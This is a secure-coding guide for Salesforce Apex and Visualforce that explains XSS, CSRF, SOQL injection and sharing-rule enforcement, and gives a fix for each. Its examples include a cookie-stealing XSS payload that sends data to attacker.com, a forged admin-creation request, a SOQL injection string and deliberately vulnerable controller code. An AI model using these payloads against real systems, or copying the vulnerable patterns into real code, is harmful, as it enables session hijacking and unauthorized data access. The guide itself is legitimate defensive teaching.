# Security Guidelines for Apex and Visualforce Development

Understand and guard against vulnerabilities in your code as you develop custom applications.

## Availability
- **Interfaces:** Salesforce Classic (not available in all orgs)
- **Editions:** Group, Professional, Enterprise, Performance, Unlimited, Developer, and Database.com Editions

📋 **Note:** Visualforce is not available in Database.com.

---

## Understanding Security

The powerful combination of **Apex and Visualforce pages** allows Lightning Platform developers to provide custom functionality and business logic to Salesforce or to create a new standalone product running inside the Lightning Platform. But as with any programming language, developers must be cognizant of potential security-related pitfalls.

### Built-in Security Defenses

🛡️ **Platform Protection:** Salesforce has incorporated several security defenses in the Lightning Platform. But careless developers can still bypass the built-in defenses and expose their applications and customers to security risks.

### Common Security Vulnerabilities

⚠️ **Risk Categories:** Many of the coding mistakes a developer can make on the Lightning Platform are:
- Similar to **general web application security vulnerabilities**
- **Unique to Apex** and the Salesforce platform

### AppExchange Certification Requirements

🏆 **Certification Requirement:** To certify an application for AppExchange, it's important for developers to learn and understand the security flaws described.

📚 **Additional Resources:** For more information, see the [Lightning Platform Security Resources](https://developer.salesforce.com/page/Security) page on Salesforce Developers.

---

## Cross-Site Scripting (XSS)

**Cross-site scripting (XSS)** attacks occur when malicious HTML or client-side scripting is provided to a web application. The web application includes malicious scripting in a response to a user who unknowingly becomes the victim of the attack.

### How XSS Attacks Work

🎯 **Attack Vector:** The attacker uses the web application as an intermediary in the attack, taking advantage of the victim's trust for the web application.

### Vulnerable Applications

⚠️ **High Risk Applications:**
- Applications that display **dynamic web pages** without properly validating data
- Applications where **input from one user is shown to another user**

**Common Targets:**
- 💬 Bulletin board or user comment-style websites
- 📰 News websites
- 📧 Email archives

### Example XSS Attack

Assume this script is included in a Lightning Platform page:

```html
<script>var foo = '{!$CurrentPage.parameters.userparam}';</script>
```

The attacker can enter this malicious value for `userparam`:

```javascript
1';document.location='http://www.attacker.com/cgi-bin/cookie.cgi?'+document.cookie;var foo='2
```

🚨 **Attack Result:** All cookies for the current page are sent to the attacker's server, allowing them to hijack the victim's session.

### Attack Impact

💥 **Attack Capabilities:**

**Simple Attacks:**
- Opening and closing windows
- Redirecting users

**Malicious Attacks:**
- 🍪 Stealing data or session cookies
- 🔓 Gaining full access to the victim's session
- 📊 Accessing sensitive information

### Lightning Platform XSS Protection

🛡️ **Built-in Defenses:** Salesforce has filters that screen out harmful characters in most output methods.

✅ **Standard Components:** All standard Visualforce components (`<apex>` tags) have **anti-XSS filters** in place.

**Safe Example:**
```html
<apex:outputText> 
    {!$CurrentPage.parameters.userInput} 
</apex:outputText>
```

### XSS Vulnerabilities

#### Disabled Escape

⚠️ **Risk Warning:** You can disable XSS protection with `escape="false"`:

```html
<apex:outputText escape="false" value="{!$CurrentPage.parameters.userInput}" />
```

#### Custom JavaScript

⚠️ **No Protection:** Custom JavaScript code has no built-in XSS protection:

```html
<script> 
    var foo = location.search; 
    document.write(foo); 
</script>
```

#### Formula Tags

🚨 **Unescaped Data:** Formula expressions like `{!$Request.*}` are rendered without escaping:

**Vulnerable:**
```html
<title>{!$Request.title}</title>
```

**Secure with SUBSTITUTE():**
```html
<title>{! SUBSTITUTE(SUBSTITUTE($Request.title,"<","&lt;"),">","&gt;")}</title>
```

### Additional Resources

📚 **Learn More:**
- [OWASP Cross Site Scripting](http://www.owasp.org/index.php/Cross_Site_Scripting)
- [CGI Security XSS FAQ](http://www.cgisecurity.com/xss-faq.html)
- [OWASP Testing for Cross Site Scripting](http://www.owasp.org/index.php/Testing_for_Cross_site_scripting)

---

## Cross-Site Request Forgery (CSRF)

**Cross-Site Request Forgery (CSRF)** flaws are attacks where a malicious website tricks an authenticated user into performing unintended actions on a trusted site.

### How CSRF Attacks Work

🎯 **Attack Method:** An attacker's webpage contains a request that performs an action on your website while the user is still authenticated.

**Example Attack:**
```html
<img src="http://www.yourwebpage.com/yourapplication/createuser?email=attacker@attacker.com&type=admin" height=1 width=1 />
```

🚨 **Success Condition:** If the user is logged into your application when they visit the attacker's page, the malicious request is executed with the user's privileges.

### Salesforce CSRF Protection

🛡️ **Built-in Defense:** Salesforce implements an **anti-CSRF token** to prevent such attacks:
- Every page includes a random string as a hidden form field
- Application validates this token on page load
- Commands won't execute unless the token matches

✅ **Coverage:** This protection works when using all **standard controllers and methods**.

### CSRF Vulnerabilities

⚠️ **Developer Risk:** Developers can bypass built-in defenses when creating custom controllers.

**Vulnerable Example:**
```html
<apex:page controller="myClass" action="{!init}"></apex:page>
```

```apex
public class myClass { 
    public void init() { 
        Id id = ApexPages.currentPage().getParameters().get('id'); 
        Account obj = [SELECT id, Name FROM Account WHERE id = :id]; 
        delete obj; 
        return ; 
    }
}
```

🚨 **Problem:** The developer bypassed anti-CSRF controls by creating their own action method without token validation.

### CSRF Prevention

🛡️ **Countermeasures:**
- Use **standard controllers** when possible
- Add **intermediate confirmation pages** for sensitive actions
- **Shorten session timeouts**
- **Educate users** to log out and avoid browsing other sites while authenticated

### Session Management

⚠️ **User Impact:** Due to built-in CSRF protection, users may encounter errors when multiple Salesforce login pages are open:
> "The page you submitted was invalid for your session."

💡 **Solution:** Users can resolve this by refreshing the login page or attempting to log in a second time.

### Additional Resources

📚 **Learn More:**
- [OWASP Cross-Site Request Forgery](http://www.owasp.org/index.php/Cross-Site_Request_Forgery)
- [CGI Security CSRF FAQ](http://www.cgisecurity.com/csrf-faq.html)
- [Chris Shiflett: Cross-Site Request Forgeries](http://shiflett.org/articles/cross-site-request-forgeries)

---

## SOQL Injection

**SOQL Injection** is similar to SQL injection but uses Salesforce Object Query Language (SOQL). SOQL is simpler and more limited than SQL, so the risks are lower, but attacks are nearly identical to traditional SQL injection.

### How SOQL Injection Works

🎯 **Attack Method:** SOQL injection takes user-supplied input and uses those values in a dynamic SOQL query. If input isn't validated, it can include SOQL commands that modify the query structure.

### Vulnerable Example

**Visualforce Page:**
```html
<apex:page controller="SOQLController">
    <apex:form>
        <apex:outputText value="Enter Name" />
        <apex:inputText value="{!name}" />
        <apex:commandButton value="Query" action="{!query}" />
    </apex:form>
</apex:page>
```

**Apex Controller:**
```apex
public class SOQLController {
    public String name {
        get { return name;}
        set { name = value;}
    } 
    public PageReference query() {
        String qryString = 'SELECT Id FROM Contact WHERE ' +
            '(IsDeleted = false and Name like \'%' + name + '%\')';
        List<Contact> queryResult = Database.query(qryString);
        System.debug('query result is ' + queryResult);
        return null;
    }
}
```

### Attack Example

**Normal Input:**
```
// User input: Bob
// Resulting query:
SELECT Id FROM Contact WHERE (IsDeleted = false and Name like '%Bob%')
```

**Malicious Input:**
```
// User input: test%') OR (Name LIKE '
// Resulting query:
SELECT Id FROM Contact WHERE (IsDeleted = false AND Name LIKE '%test%') OR (Name LIKE '%')
```

🚨 **Result:** The query now returns **all contacts**, not just non-deleted ones.

### SOQL Injection Prevention

#### Method 1: Static SOQL with Bind Variables (Recommended)

```apex
public class SOQLController { 
    public String name { 
        get { return name;} 
        set { name = value;} 
    } 
    public PageReference query() { 
        String queryName = '%' + name + '%';
        List<Contact> queryResult = [SELECT Id FROM Contact WHERE 
           (IsDeleted = false and Name like :queryName)];
        System.debug('query result is ' + queryResult);
        return null; 
    } 
}
```

#### Method 2: escapeSingleQuotes() Method

If you must use dynamic SOQL:

```apex
String safeName = String.escapeSingleQuotes(name);
String qryString = 'SELECT Id FROM Contact WHERE Name like \'%' + safeName + '%\'';
```

🛡️ **Protection:** The `escapeSingleQuotes()` method adds escape characters to single quotes, ensuring they're treated as string data rather than commands.

---

## Data Access Control

The Lightning Platform makes extensive use of **data sharing rules**. Each object has permissions and sharing settings that control user access for read, create, edit, and delete operations.

### Standard Controller Behavior

✅ **Automatic Enforcement:** These settings are **enforced when using all standard controllers**.

### Apex Class Behavior

⚠️ **No Default Enforcement:** When using an Apex class, the built-in user permissions and field-level security restrictions **aren't respected during execution**.

🚨 **Default Risk:** An Apex class can **read and update all data** by default.

### Vulnerable Example

```apex
public class customController { 
    public void read() { 
        Contact contact = [SELECT id FROM Contact WHERE Name = :value]; 
    } 
}
```

**Problem:** All contact records are searched, even if the current user doesn't have permission to view them.

### Solution: with sharing

```apex
public with sharing class customController { 
    // Class implementation
}
```

🛡️ **Protection:** The `with sharing` keyword directs the platform to use the security sharing permissions of the currently logged-in user, rather than granting full access to all records.

### Sharing Keywords

| Keyword | Behavior |
|---------|----------|
| `with sharing` | Enforces user's sharing rules and permissions |
| `without sharing` | Runs in system context (full access) |
| `inherited sharing` | Inherits sharing context from calling code |

---

## Security Best Practices Summary

### ✅ Recommended Practices

1. **Use standard Visualforce components** whenever possible
2. **Enable escape by default** on all user input
3. **Validate and sanitize** all user-supplied data
4. **Use static SOQL** with bind variables
5. **Declare classes with `with sharing`** to respect user permissions
6. **Use standard controllers** to leverage built-in CSRF protection
7. **Implement proper session management** and user education

### ⚠️ Common Pitfalls to Avoid

1. **Setting `escape="false"`** without proper validation
2. **Using dynamic SOQL** without input sanitization  
3. **Creating custom controllers** without CSRF protection
4. **Omitting sharing keywords** in Apex classes
5. **Including user input** in JavaScript or formula expressions
6. **Using `<apex:includeScript>`** with user-controlled values

### 🚨 Critical Security Checks

- [ ] All user input is properly validated and escaped
- [ ] Apex classes use appropriate sharing keywords
- [ ] Dynamic SOQL uses bind variables or `escapeSingleQuotes()`
- [ ] Custom controllers implement CSRF protection
- [ ] JavaScript code doesn't include unescaped user input
- [ ] Formula expressions use `SUBSTITUTE()` for user data

By following these guidelines, developers can create secure applications that protect both the organization's data and user privacy while maintaining the powerful functionality of the Lightning Platform.